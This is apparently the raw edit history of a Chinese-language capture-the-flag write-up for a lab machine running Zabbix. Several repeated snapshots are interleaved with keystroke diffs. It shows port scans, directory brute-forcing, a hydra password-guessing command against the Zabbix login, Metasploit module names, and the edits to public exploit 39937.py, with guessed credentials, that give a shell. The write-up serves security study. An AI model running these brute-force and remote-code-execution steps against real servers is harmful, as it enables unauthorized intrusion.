(10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n## web\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n---\n```\n发现一个登陆表单，searchsploit zabbix，常规操作\n",[[1559355698552,["whale@Whale",[[1,1193,"\r\n/server-status (Status: 403)\r\n"]],[1172,1193],[1225,1225]]],[1559355826847,[null,[[-1,1193,"\r"],[1,1194,"\n"],[-1,1223,"\r"],[1,1224,"\n"]],[1193,1193],[1225,1225]]],[1559355826847,[null,[[1,1193,"\r"],[-1,1193,"\n"],[1,1223,"\r"],[-1,1223,"\n"]],[1225,1225],[1193,1193]]],[1559355814501,["whale@Whale",[[1,598,"\n"],[-1,1193,"\r"],[-1,1223,"\r"]],[597,597],[598,598]]],[1559355825185,["whale@Whale",[[1,598,"nc 10.10.10.108 10050"]],[598,598],[619,619]]],[1559355867556,["whale@Whale",[[1,620,"\n"]],[619,619],[620,620]]],[1559355867878,["whale@Whale",[[1,620,"nmap 10.10.10.108 -p 10050"]],[620,620],[646,646]]],[1559355879401,["whale@Whale",[[1,647,"\n"]],[646,646],[647,647]]],[1559355879675,["whale@Whale",[[1,647,"10050/tcp open  zabbix-agent"]],[647,647],[675,675]]],[1559355888762,["whale@Whale",[[1,676,"\n"]],[675,675],[676,676]]],[1559355888976,["whale@Whale",[[1,677,"\n"]],[676,676],[677,677]]],[1559355890118,["whale@Whale",[[1,677,"```"]],[677,677],[680,680]]],[1559355891232,["whale@Whale",[[1,681,"\n"]],[680,680],[681,681]]],[1559355893432,["whale@Whale",[[-1,594,"```"]],[594,597],[594,594]]],[1559355894505,["whale@Whale",[[1,594,"---"]],[594,594],[597,597]]],[1559355897912,["whale@Whale",[[1,620,"\n"]],[619,619],[620,620]]],[1559355898592,["whale@Whale",[[1,620,"---"]],[620,620],[623,623]]],[1559355956088,["whale@Whale",[[1,620,"\n"]],[619,619],[620,620]]],[1559355957325,["whale@Whale",[[1,620,"j"]],[620,620],[621,621]]],[1559355958166,["whale@Whale",[[-1,620,"j"]],[621,621],[620,620]]],[1559355965445,["whale@Whale",[[1,620,"结果没有任何事"]],[620,620],[627,627]]],[1559355965644,["whale@Whale",[[-1,626,"事"]],[627,627],[626,626]]],[1559355973706,["whale@Whale",[[1,626,"提示或者报错，说明端口开放"]],[626,626],[639,639]]],[1559355977508,["whale@Whale",[[1,644,"\n"]],[643,643],[644,644]]],[1559355982392,["whale@Whale",[[1,644,"于是进行版本扫描"]],[644,644],[652,652]]],[1559355988524,["whale@Whale",[[1,594,"\n"]],[593,593],[594,594]]],[1559355993563,["whale@Whale",[[1,594,"以上结果"]],[594,594],[598,598]]],[1559355995659,["whale@Whale",[[1,594,"\n"]],[594,594],[595,595]]],[1559356006673,["whale@Whale",[[1,599,"说明22"]],[599,599],[603,603]]],[1559356007599,["whale@Whale",[[1,603,"、"]],[603,603],[604,604]]],[1559356008982,["whale@Whale",[[-1,601,"22、"]],[604,604],[601,601]]],[1559356010256,["whale@Whale",[[1,601,"ssh\\"]],[601,601],[605,605]]],[1559356011177,["whale@Whale",[[-1,604,"\\"]],[605,605],[604,604]]],[1559356033724,["whale@Whale",[[1,604,"、web以及其他不明2端口开放，需要进一步做探测。"]],[604,604],[629,629]]],[1559356062414,["whale@Whale",[[1,745,"---"]],[745,745],[748,748]]],[1559356062705,["whale@Whale",[[1,749,"\n"]],[748,748],[749,749]]],[1559356065164,["whale@Whale",[[1,749,"2048"]],[749,749],[753,753]]],[1559356078170,["whale@Whale",[[1,753,"端口扫描，提示端口关闭，于是忽略"]],[753,753],[769,769]]],[1559356085524,["whale@Whale",[[1,757,"结果"]],[757,757],[759,759]]],[1559356150667,["whale@Whale",[[1,2570,"\n"]],[2569,2569],[2570,2570]]],[1559356150857,["whale@Whale",[[1,2571,"\n"]],[2570,2570],[2571,2571]]],[1559356159703,["whale@Whale",[[-1,2571,"\n"],[1,2572,"## 10050 port"]],[2571,2571],[2584,2584]]],[1559356160694,["whale@Whale",[[1,2584,"\n\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) "]],[2584,2584],[2648,2648]]],[1559356246827,[null,[[-1,2585,"\n"],[1,2649,"\n"]],[2585,2585],[2650,2650]]],[1559356246827,[null,[[1,2585,"\n"],[-1,2648,"\n"]],[2650,2650],[2585,2585]]],[1559356237622,["whale@Whale",[[1,2585,"\n"]],[2584,2584],[2585,2585]]],[1559356237862,["whale@Whale",[[1,2585,"searchsploit zabbix"]],[2585,2585],[2604,2604]]],[1559356366869,[null,[[-1,2605,"\n"],[1,2669,"\n"]],[2605,2605],[2670,2670]]],[1559356366869,[null,[[1,2605,"\n"],[-1,2668,"\n"]],[2670,2670],[2605,2605]]],[1559356336840,["whale@Whale",[[1,2585,"\n"]],[2584,2584],[2585,2585]]],[1559356340875,["whale@Whale",[[1,2585,"http://10.10.10.108:10050"]],[2585,2585],[2610,2610]]],[1559356487863,[null,[[-1,2631,"\n"],[1,2695,"\n"]],[2631,2631],[2696,2696]]],[1559356487863,[null,[[1,2631,"\n"],[-1,2694,"\n"]],[2696,2696],[2631,2631]]],[1559356482964,["whale@Whale",[[1,2695,"\n"]],[2694,2694],[2695,2695]]],[1559356483154,["whale@Whale",[[1,2696,"\n"]],[2695,2695],[2696,2696]]],[1559356483388,["whale@Whale",[[1,2696,"use exploit/linux/misc/zabbix_server_exec\r\n"]],[2696,2696],[2739,2739]]],[1559356547838,[null,[[-1,2631,"\n"],[1,2696,"\n"],[-1,2737,"\r"],[1,2738,"\n"]],[2631,2631],[2739,2739]]],[1559356547839,[null,[[1,2631,"\n"],[-1,2695,"\n"],[1,2737,"\r"],[-1,2737,"\n"]],[2739,2739],[2631,2631]]],[1559356499192,["whale@Whale",[[-1,2737,"\r\n\n"],[1,2740,"\nuse exploit/unix/misc/zabbix_agent_exec"]],[2739,2739],[2777,2777]]],[1559356667827,[null,[[-1,2631,"\n"],[1,2695,"\n"]],[2631,2631],[2696,2696]]],[1559356667827,[null,[[1,2631,"\n"],[-1,2694,"\n"]],[2696,2696],[2631,2631]]],[1559356607955,["whale@Whale",[[1,9,"\n"]],[8,8],[9,9]]],[1559356608415,["whale@Whale",[[-1,9,"\n"]],[9,9],[8,8]]],[1559356608914,["whale@Whale",[[-1,8,"\n"]],[8,8],[7,7]]],[1559356609012,["whale@Whale",[[-1,4,"==="]],[7,7],[4,4]]],[1559356609045,["whale@Whale",[[-1,4,"\n"]],[4,4],[3,3]]],[1559356609143,["whale@Whale",[[-1,0,"108"]],[3,3],[0,0]]],[1559356611295,["whale@Whale",[[1,0,"## scan"]],[0,0],[7,7]]],[1559356629061,["whale@Whale",[[1,1218," enum"]],[1218,1218],[1223,1223]]],[1559356727817,[null,[[-1,2635,"\n"],[1,2699,"\n"]],[2635,2635],[2700,2700]]],[1559356727817,[null,[[1,2635,"\n"],[-1,2698,"\n"]],[2700,2700],[2635,2635]]],[1559356705764,["whale@Whale",[[1,1223,"eration"]],[1223,1223],[1230,1230]]],[1559362251933,[null,[[-1,2642,"\n"],[1,2706,"\n"]],[2642,2642],[2707,2707]]],[1559362251933,[null,[[1,2642,"\n"],[-1,2705,"\n"]],[2707,2707],[2642,2642]]],[1559362239967,["whale@Whale",[[1,2213,"```"]],[2213,2213],[2216,2216]]],[1559362242793,["whale@Whale",[[1,2217,"\n"]],[2216,2216],[2217,2217]]],[1559362243442,["whale@Whale",[[1,2218,"\n"]],[2217,2217],[2218,2218]]],[1559362431919,[null,[[-1,2647,"\n"],[1,2711,"\n"]],[2647,2647],[2712,2712]]],[1559362431919,[null,[[1,2647,"\n"],[-1,2710,"\n"]],[2712,2712],[2647,2647]]],[1559362429259,["whale@Whale",[[-1,2548,"```"]],[2548,2551],[2548,2548]]]]],["2f4be7a0-48da-4f0a-b92c-036b617dfdb4",1569656066586,"## scan\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n\n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。\n---\nnc 10.10.10.108 10050\n结果没有任何提示或者报错，说明端口开放\n---\n于是进行版本扫描\nnmap 10.10.10.108 -p 10050\n10050/tcp open  zabbix-agent\n---\n2048端口扫描结果，提示端口关闭，于是忽略\n```\n\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n## web enumeration\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n/server-status (Status: 403)\n\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n```\n\n\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n---\n\n发现一个登陆表单，searchsploit zabbix，常规操作\n\n## 10050 port\nhttp://10.10.10.108:10050\nsearchsploit zabbix\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \n\nuse exploit/linux/misc/zabbix_server_exec\nuse exploit/unix/misc/zabbix_agent_exec",[[1569656023451,["whale@Whale",[[-1,363,"\n"]],[363,363],[362,362]]],[1569656024275,["whale@Whale",[[-1,408,"\n"]],[408,408],[407,407]]],[1569656026586,["whale@Whale",[[-1,108,"\n"]],[108,108],[107,107]]],[1569656027255,["whale@Whale",[[-1,171,"\n"]],[171,171],[170,170]]],[1569656027882,["whale@Whale",[[-1,235,"\n"]],[235,235],[234,234]]],[1569656155602,["whale@Whale",[[-1,2213,"\n"]],[2213,2213],[2212,2212]]],[1569656155848,["whale@Whale",[[-1,2212,"\n"]],[2212,2212],[2211,2211]]],[1569665501759,["whale@Whale",[[1,2783,"\n\n"]],[2783,2783],[2784,2784]]],[1569665501978,["whale@Whale",[[1,2785,"\n"]],[2784,2784],[2785,2785]]],[1569665502621,["whale@Whale",[[-1,2785,"\n"],[1,2786,"---"]],[2785,2785],[2788,2788]]],[1569665510804,["whale@Whale",[[1,2788,"\n\n![14]($res/14.PNG)\n\n"]],[2788,2788],[2809,2809]]],[1569665518416,["whale@Whale",[[1,2789,"log in as ge"]],[2789,2789],[2801,2801]]],[1569665518815,["whale@Whale",[[-1,2800,"e"]],[2801,2801],[2800,2800]]],[1569665519749,["whale@Whale",[[1,2800,"ust"]],[2800,2800],[2803,2803]]],[1569665520930,["whale@Whale",[[-1,2801,"st"]],[2803,2803],[2801,2801]]],[1569665522276,["whale@Whale",[[1,2801,"est,"]],[2801,2801],[2805,2805]]],[1569665523011,["whale@Whale",[[-1,2804,","]],[2805,2805],[2804,2804]]],[1569665528696,["whale@Whale",[[1,2804,"，在主页面发现了"]],[2804,2804],[2812,2812]]],[1569665549714,["whale@Whale",[[1,2812,"一个用户名Zipper"]],[2812,2812],[2823,2823]]],[1569666109454,["whale@Whale",[[1,2789,"\n"]],[2788,2788],[2789,2789]]],[1569666109834,["whale@Whale",[[1,2790,"\n"]],[2789,2789],[2790,2790]]],[1569666114213,["whale@Whale",[[1,2790,"## writeup"]],[2790,2790],[2800,2800]]],[1569666117124,["whale@Whale",[[1,2835,","]],[2835,2835],[2836,2836]]],[1569666117869,["whale@Whale",[[-1,2835,","]],[2836,2836],[2835,2835]]],[1569666130119,["whale@Whale",[[1,2835,"，仔细查找网页内容，把zapper\\"]],[2835,2835],[2853,2853]]],[1569666130732,["whale@Whale",[[-1,2852,"\\"]],[2853,2853],[2852,2852]]],[1569666134948,["whale@Whale",[[1,2852,"、Zipp"]],[2852,2852],[2857,2857]]],[1569666135802,["whale@Whale",[[1,2857,"er\\"]],[2857,2857],[2860,2860]]],[1569666136336,["whale@Whale",[[-1,2859,"\\"]],[2860,2860],[2859,2859]]],[1569666147821,["whale@Whale",[[1,2859,"、zipper添加到字典中进行爆破"]],[2859,2859],[2876,2876]]],[1569666150557,["whale@Whale",[[1,2897,"\n"]],[2896,2896],[2897,2897]]],[1569668783110,["whale@Whale",[[-1,2897,"\n"],[1,2898,"修改exp"]],[2897,2897],[2902,2902]]],[1569668820759,["whale@Whale",[[1,2902,"\n\nsearchsploit -m exploits/php/webapps/39937.py"]],[2902,2902],[2948,2948]]],[1569668822042,["whale@Whale",[[1,2949,"\n"]],[2948,2948],[2949,2949]]],[1569669440065,[null,[[-1,2903,"\n"],[1,2950,"\n"]],[2903,2903],[2951,2951]]],[1569669440066,[null,[[1,2903,"\n"],[-1,2949,"\n"]],[2951,2951],[2903,2903]]],[1569669391757,["whale@Whale",[[1,2903,"\n"]],[2902,2902],[2903,2903]]],[1569669395275,["whale@Whale",[[1,2951,"\n"]],[2949,2949],[2950,2950]]],[1569669395504,["whale@Whale",[[1,2952,"\n"]],[2950,2950],[2951,2951]]],[1569669396884,["whale@Whale",[[1,2951,"login = 'zapper'\t\t### Zabbix login\r\r\npassword = 'zapper'\t### Zabbix password\r\r\nhostid = '10105'\t### Zabbix hostid"]],[2951,2951],[3064,3064]]],[1569670100258,[null,[[-1,2904,"\n"],[1,2951,"\n"],[-1,2985,"\r\r"],[1,2987,"\n\n"],[-1,3027,"\r\r"],[1,3029,"\n\n"]],[2904,2904],[3031,3031]]],[1569670100258,[null,[[1,2904,"\n"],[-1,2950,"\n"],[1,2985,"\r\r"],[-1,2985,"\n\n"],[1,3027,"\r\r"],[-1,3027,"\n\n"]],[3031,3031],[2904,2904]]],[1569670059892,["whale@Whale",[[-1,2985,"\r\r"],[-1,3027,"\r\r"],[1,3029,"\n"]],[2986,2986],[2985,2985]]],[1569670060875,["whale@Whale",[[-1,3026,"\n"]],[3026,3026],[3025,3025]]],[1569670083617,["whale@Whale",[[1,2904,"\n"]],[2903,2903],[2904,2904]]],[1569670085922,["whale@Whale",[[1,2904,"```"]],[2904,2904],[2907,2907]]],[1569670087446,["whale@Whale",[[-1,3065,"\n"],[1,3066,"```"]],[3065,3065],[3068,3068]]],[1569672949047,[null,[[-1,2908,"\n"],[1,2954,"\n"]],[2908,2908],[2955,2955]]],[1569672949047,[null,[[1,2908,"\n"],[-1,2953,"\n"]],[2955,2955],[2908,2908]]],[1569672940601,["whale@Whale",[[1,2955,"\n"]],[2954,2954],[2955,2955]]],[1569672941604,["whale@Whale",[[1,2955,"v"]],[2955,2955],[2956,2956]]],[1569672942690,["whale@Whale",[[-1,2955,"v"]],[2956,2956],[2955,2955]]],[1569672944016,["whale@Whale",[[1,2955,"ZABIX_ROOT = 'http://10.10.10.108/zabbix'\t### Zabbix IP-address"]],[2955,2955],[3018,3018]]],[1569673009172,[null,[[-1,2908,"\n"],[1,2954,"\n"]],[2908,2908],[2955,2955]]],[1569673009172,[null,[[1,2908,"\n"],[-1,2953,"\n"]],[2955,2955],[2908,2908]]],[1569672981282,["whale@Whale",[[1,3129,"\n"]],[3128,3128],[3129,3129]]],[1569672981687,["whale@Whale",[[1,3130,"\n"]],[3129,3129],[3130,3130]]],[1569672986502,["whale@Whale",[[1,3130,"python 39937.py k"]],[3130,3130],[3147,3147]]],[1569672986879,["whale@Whale",[[-1,3146,"k"]],[3147,3147],[3146,3146]]],[1569672996208,["whale@Whale",[[1,3146,"即可拿到shell"]],[3146,3146],[3155,3155]]],[1569673489048,[null,[[-1,2908,"\n"],[1,2954,"\n"]],[2908,2908],[2955,2955]]],[1569673489048,[null,[[1,2908,"\n"],[-1,2953,"\n"]],[2955,2955],[2908,2908]]],[1569673475561,["whale@Whale",[[1,2897,"\n"]],[2896,2896],[2897,2897]]],[1569673475798,["whale@Whale",[[1,2898,"\n"]],[2897,2897],[2898,2898]]],[1569673481293,["whale@Whale",[[1,2897,"## nad"]],[2897,2897],[2903,2903]]],[1569673482021,["whale@Whale",[[-1,2900,"nad"]],[2903,2903],[2900,2900]]],[1569673486295,["whale@Whale",[[1,2900,"拿到服务器参数"]],[2900,2900],[2907,2907]]],[1569673486586,["whale@Whale",[[1,2909,"\n"]],[2907,2907],[2908,2908]]],[1569673487524,["whale@Whale",[[1,2908,"curl -i -X POST -H 'Content-type:application/json' -d\r\n'{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{\r\n\"user\":\"zapper\",\"password\":\"zapper\"},\"auth\":null,\"id\":0}'"]],[2908,2908],[3072,3072]]],[1569673549036,[null,[[-1,2961,"\r"],[1,2962,"\n"],[-1,3013,"\r"],[1,3014,"\n"],[-1,3085,"\n"],[1,3131,"\n"]],[2961,2961],[3132,3132]]],[1569673549036,[null,[[1,2961,"\r"],[-1,2961,"\n"],[1,3013,"\r"],[-1,3013,"\n"],[1,3085,"\n"],[-1,3130,"\n"]],[3132,3132],[2961,2961]]],[1569673490630,["whale@Whale",[[-1,2961,"\r\n"],[-1,3013,"\r"]],[2961,2961],[2961,2961]]],[1569673491120,["whale@Whale",[[1,2961," "]],[2961,2961],[2962,2962]]],[1569673547523,["whale@Whale",[[-1,3012,"\n"]],[2908,3070],[3069,3069]]],[1569673609023,[null,[[-1,3082,"\n"],[1,3128,"\n"]],[3082,3082],[3129,3129]]],[1569673609023,[null,[[1,3082,"\n"],[-1,3127,"\n"]],[3129,3129],[3082,3082]]],[1569673608330,["whale@Whale",[[1,3069," "]],[3069,3069],[3070,3070]]],[1569673669005,[null,[[-1,3083,"\n"],[1,3129,"\n"]],[3083,3083],[3130,3130]]],[1569673669005,[null,[[1,3083,"\n"],[-1,3128,"\n"]],[3130,3130],[3083,3083]]],[1569673609435,["whale@Whale",[[1,3070,"/zabbix/api_jsonrpc.php"]],[3070,3070],[3093,3093]]],[1569673619292,["whale@Whale",[[1,3070,"http://10.10.10.108/zabbix"]],[3070,3070],[3096,3096]]],[1569673621941,["whale@Whale",[[-1,3089,"/zabbix"]],[3096,3096],[3089,3089]]],[1569677000080,[null,[[-1,3125,"\n"],[1,3171,"\n"]],[3125,3125],[3172,3172]]],[1569677000080,[null,[[1,3125,"\n"],[-1,3170,"\n"]],[3172,3172],[3125,3125]]],[1569676967206,["whale@Whale",[[-1,2908,"curl -i -X POST -H 'Content-type:application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{\"user\":\"zapper\",\"password\":\"zapper\"},\"auth\":null,\"id\":0}' http://10.10.10.108/zabbix/api_jsonrpc.php"]],[2908,3112],[2908,2908]]],[1569676985059,["whale@Whale",[[1,2908,"通过官网拿到za"]],[2908,2908],[2916,2916]]],[1569676987810,["whale@Whale",[[-1,2912,"拿到za"]],[2916,2916],[2912,2912]]],[1569676988630,["whale@Whale",[[1,2912,"huo"]],[2912,2912],[2915,2915]]],[1569676989362,["whale@Whale",[[-1,2912,"huo"]],[2915,2915],[2912,2912]]],[1569676998597,["whale@Whale",[[1,2912,"获得api使用方法：https://www.zabbix.com/documentation/3.0/manual/api"]],[2912,2912],[2973,2973]]],[1569677060038,[null,[[-1,2986,"\n"],[1,3032,"\n"]],[2986,2986],[3033,3033]]],[1569677060038,[null,[[1,2986,"\n"],[-1,3031,"\n"]],[3033,3033],[2986,2986]]],[1569677003680,["whale@Whale",[[1,2975,"\n"]],[2974,2974],[2975,2975]]],[1569677007431,["whale@Whale",[[1,2975,"通过api拿到"]],[2975,2975],[2982,2982]]],[1569677014851,["whale@Whale",[[-1,2980,"拿到"]],[2982,2982],[2980,2980]]],[1569677024925,["whale@Whale",[[1,2980,"，查询到服务器参数，然后"]],[2980,2980],[2992,2992]]],[1569677025691,["whale@Whale",[[-1,2992,"\n"]],[2992,2992],[2992,2992]]]]],["b97e3fdc-b4c7-4fb3-b532-5a7187b83e44",1569754398272,"## scan\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。\n---\nnc 10.10.10.108 10050\n结果没有任何提示或者报错，说明端口开放\n---\n于是进行版本扫描\nnmap 10.10.10.108 -p 10050\n10050/tcp open  zabbix-agent\n---\n2048端口扫描结果，提示端口关闭，于是忽略\n```\n\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n## web enumeration\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n/server-status (Status: 403)\n\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n```\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n---\n\n发现一个登陆表单，searchsploit zabbix，常规操作\n\n## 10050 port\nhttp://10.10.10.108:10050\nsearchsploit zabbix\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \n\nuse exploit/linux/misc/zabbix_server_exec\nuse exploit/unix/misc/zabbix_agent_exec\n\n---\n\n## writeup\nlog in as guest，在主页面发现了一个用户名Zipper，仔细查找网页内容，把zapper、Zipper、zipper添加到字典中进行爆破\n![14]($res/14.PNG)\n\n## 拿到服务器参数\n通过官网获得api使用方法：https://www.zabbix.com/documentation/3.0/manual/api\n\n通过api，查询到服务器参数，然后修改exp\n\n```\nsearchsploit -m exploits/php/webapps/39937.py\n\nZABIX_ROOT = 'http://10.10.10.108/zabbix'\t### Zabbix IP-address\nlogin = 'zapper'\t\t### Zabbix login\npassword = 'zapper'\t### Zabbix password\nhostid = '10105'\t### Zabbix hostid\n\npython 39937.py 即可拿到shell\n```",[[1569754360339,["whale@Whale",[[1,3245,"web"]],[3245,3245],[3248,3248]]],[1569754535714,["whale@Whale",[[-1,3028,"p"]],[3029,3029],[3028,3028]]],[1569754777002,["whale@Whale",[[1,3256,"\n\n"]],[3256,3256],[3257,3257]]],[1569754779621,["whale@Whale",[[-1,3257,"\n"],[1,3258,"## lou"]],[3257,3257],[3263,3263]]],[1569754780388,["whale@Whale",[[-1,3260,"lou"]],[3263,3263],[3260,3260]]],[1569754781683,["whale@Whale",[[1,3260,"漏洞"]],[3260,3260],[3262,3262]]],[1569754783797,["whale@Whale",[[-1,3260,"漏洞"]],[3262,3262],[3260,3260]]],[1569754792641,["whale@Whale",[[1,3260,"存在的漏洞"]],[3260,3260],[3265,3265]]],[1569754792913,["whale@Whale",[[1,3265,"\n\n"]],[3265,3265],[3266,3266]]],[1569754796637,["whale@Whale",[[-1,3266,"\n"]],[3266,3266],[0,0]]],[1569754797013,["whale@Whale",[[1,3265,"g"]],[0,0],[3265,3266]]],[1569754797996,["whale@Whale",[[-1,3265,"g"]],[3265,3266],[3265,3265]]],[1569754798454,["whale@Whale",[[1,3266,"\n"]],[3265,3265],[3266,3266]]],[1569754810821,["whale@Whale",[[-1,3266,"\n"],[1,3267,"guest匿名登陆+信息泄露"]],[3266,3266],[3280,3280]]],[1569754811185,["whale@Whale",[[1,3280,"\n\n"]],[3280,3280],[3281,3281]]],[1569754815947,["whale@Whale",[[-1,3281,"\n"],[1,3282,"弱密码"]],[3281,3281],[3284,3284]]],[1569754820811,["whale@Whale",[[1,3266,"\n"]],[3266,3266],[3267,3267]]],[1569754822350,["whale@Whale",[[1,3266,"·"]],[3266,3266],[3267,3267]]],[1569754823020,["whale@Whale",[[-1,3266,"·"]],[3267,3267],[3266,3266]]],[1569754824136,["whale@Whale",[[1,3266,"```"]],[3266,3266],[3269,3269]]],[1569754825784,["whale@Whale",[[1,3288,"\n\n"]],[3288,3288],[3289,3289]]],[1569754826068,["whale@Whale",[[1,3290,"\n"]],[3289,3289],[3290,3290]]],[1569754826784,["whale@Whale",[[-1,3290,"\n"],[1,3291,"```"]],[3290,3290],[3293,3293]]],[